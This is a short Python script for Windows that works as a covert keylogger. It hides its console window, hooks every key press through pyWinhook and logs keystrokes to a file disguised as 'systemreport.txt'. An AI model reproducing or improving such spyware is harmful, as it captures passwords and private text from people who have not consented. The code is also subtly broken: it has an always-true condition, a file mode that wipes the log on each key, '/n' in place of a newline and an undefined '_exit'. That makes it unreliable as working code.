import win32api
import win32console
import win32gui
import pythoncom
import pyWinhook
  
win = win32console.GetConsoleWindow()
win32gui.ShowWindow(win, 0)
  
def OnKeyboardEvent(event):
    f = open('systemreport.txt','w+')
    if event.Ascii==5:
        _exit(1)
    if event.Ascii !=0 or 8:
    #open output.txt to read current keystrokes
        f = open('systemreport.txt', 'r+')
        buffer = f.read()
        f.close()
    # open output.txt to write current + new keystrokes
        f = open('systemreport.txt', 'w')
        keylogs = chr(event.Ascii)
        if event.Ascii == 13:
         keylogs = '/n'
         buffer += keylogs
         f.write(buffer)
         f.close()
# create a hook manager object
hm = pyWinhook.HookManager()
hm.KeyDown = OnKeyboardEvent
# set the hook
hm.HookKeyboard()
# wait forever
pythoncom.PumpMessages()